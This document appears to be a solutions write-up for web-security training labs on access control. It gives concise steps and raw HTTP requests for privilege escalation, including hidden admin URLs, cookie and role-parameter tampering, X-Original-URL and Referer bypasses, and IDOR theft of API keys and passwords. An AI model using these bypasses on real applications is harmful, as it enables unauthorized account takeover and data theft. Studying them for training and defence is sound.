# Access control vulnerabilities and privilege escalation

## Vertical privilege escalation

### Unprotected admin functionality
See `/robots.txt`:
```
User-agent: *
Disallow: /administrator-panel
```
Go to `/administrator-panel` and delete `carlos`


### Unprotected admin functionality with unpredictable URL
See page source:
```javascript
var isAdmin = false;
if (isAdmin) {
   var topLinksTag = document.getElementsByClassName("top-links")[0];
   var adminPanelTag = document.createElement('a');
   adminPanelTag.setAttribute('href', '/admin-gtn1ro');
   adminPanelTag.innerText = 'Admin panel';
   topLinksTag.append(adminPanelTag);
   topLinksTag.append(' |');
}
```
Go to `/admin-gtn1ro` and delete `carlos`

### User role controlled by request parameter
Login, change cookie `Admin` from `false` to `true` (in Chrome Dev Tools / Application / Cookies),
reload, go to `/admin` and delete `carlos`.

### User role can be modified in user profile
Change email and add `roleid` to JSON payload:
```
POST /my-account/change-email HTTP/1.1
{
  "email": "jan.verner22@gmail.com",
  "roleid": 2
}

---

HTTP/1.1 302 Found
Location: /
Content-Type: application/json
Connection: close
Content-Length: 126

{
  "username": "wiener",
  "email": "jan.verner22@gmail.com",
  "apikey": "82Ods0VFJcVcG8mMKetdWifiyT5VonpW",
  "roleid": 2
}
```

Go to `/admin` and delete `carlos`

### URL-based access control can be circumvented
GET `/` is allowed. Server takes the URL from header `X-Original-URL`:
```
GET / HTTP/1.1
Host: ac791faa1fd9fd48804b72c000ca00ff.web-security-academy.net
...
X-Original-URL: /admin
```
Delete `carlos`:
```
POST /?username=carlos HTTP/1.1
Host: ac791faa1fd9fd48804b72c000ca00ff.web-security-academy.net
...
X-Original-URL: /admin/delete
```

### Method-based access control can be circumvented
Convert POST to GET:
```
GET /admin-roles?username=wiener&action=upgrade HTTP/1.1
Host: ac2f1f141e3530df806529d300e600eb.web-security-academy.net
Cookie: session=D5Llj1J9TOR3PU6mrFflpDpiyCAqysRX
```

## Horizontal privilege escalation

### User ID controlled by request parameter
Just change `/my-account?id=wiener` to `/my-account?id=carlos` and copy the API key.

### User ID controlled by request parameter, with unpredictable user IDs
Go to Meeting Up blog. Its author is `carlos`. Go to carlos' blog and grab the GUID from the URL
`/blogs?userId=f7336bea-3eb9-4d5b-b6f1-14923e585a21`.

Login as `wiener` and just change `/my-account?id=04918d2a-9880-4e15-8130-497e52eee7a9`
to `/my-account?id=f7336bea-3eb9-4d5b-b6f1-14923e585a21` and copy the API key.

### User ID controlled by request parameter with data leakage in redirect
Login as `wiener`, change `id` to `carlos` and grab the API key from redirect body.

## Horizontal to vertical privilege escalation

### User ID controlled by request parameter with password disclosure
Login and go to `/my-account?id=administrator`. Grab the admin's password from the page source code.

Login as `administrator` and delete `carlos`

## Insecure direct object references (IDOR)

### Insecure direct object references
Download Carlos' transcript from https://ac1e1fa91ef1ec0e8056735500d20042.web-security-academy.net/download-transcript/1.txt.

Get the password from it and login.

## Access control vulnerabilities in multi-step processes

### Multi-step process with no access control on one step
Login as `wiener`
```
POST /admin-roles HTTP/1.1
Host: ac921fa31f6f4ed680af2547005f00a4.web-security-academy.net
...
Cookie: session=8I4G196qkAVO0KK7vBAnqfJUTD9Rlt1e

username=wiener&action=upgrade&confirmed=true
```

### Referer-based access control
Login as `wiener`
```
GET /admin-roles?username=wiener&action=upgrade HTTP/1.1
Host: ac831f5d1e3ca2f4803137b200e30096.web-security-academy.net
...
Referer: https://ac831f5d1e3ca2f4803137b200e30096.web-security-academy.net/admin
Cookie: session=PwJLSvlmkXzjmWCn5BL6c9w601RH5Zzt
```